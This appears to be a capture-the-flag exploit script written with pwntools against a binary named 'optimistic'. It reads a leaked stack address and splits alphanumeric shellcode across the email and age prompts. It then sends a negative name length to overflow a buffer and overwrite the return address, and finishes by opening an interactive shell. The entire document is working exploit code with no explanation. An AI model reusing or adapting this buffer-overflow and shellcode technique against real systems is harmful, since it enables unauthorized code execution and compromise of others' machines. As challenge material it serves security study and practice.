#!/usr/bin/env python3

from pwn import *

context.binary = 'optimistic'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b'Would you like to enroll yourself? (y/n): ', b'y')
    p.recvuntil(b'Great! Here\'s a small welcome gift: ')
    stack_leak = int(p.recvline().decode(), 16)
    log.info(f'Stack leak: {hex(stack_leak)}')

    shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'

    p.sendafter(b'Email: ', shellcode[:8])
    p.sendafter(b'Age: ', shellcode[8:16])
    p.sendlineafter(b'Length of name: ', b'-1')

    offset = 104

    payload  = shellcode[16:]
    payload += b'C' * (offset - len(payload))
    payload += p64(stack_leak - 0x70)

    p.sendafter(b'Name: ', payload)
    p.interactive()


if __name__ == '__main__':
    main()
